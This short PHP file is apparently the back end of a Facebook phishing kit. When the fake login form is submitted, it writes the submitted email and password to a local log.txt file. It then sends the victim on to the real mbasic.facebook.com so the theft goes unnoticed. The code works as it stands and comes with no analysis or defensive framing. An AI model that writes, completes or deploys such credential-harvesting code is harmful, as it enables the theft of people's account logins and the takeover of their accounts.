
<?php

//If Submit Button Is Clicked Do the Following
if ($_POST['login']){

$myFile = "log.txt";
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = "user:" . $_POST['email'] . "\n";
fwrite($fh, $stringData);
$stringData = "pass:" . $_POST['passw'] . "\n";
fwrite($fh, $stringData);
fclose($fh);

} ?>



<script>location.href='https://mbasic.facebook.com';</script>
	 
 </body>
</html>
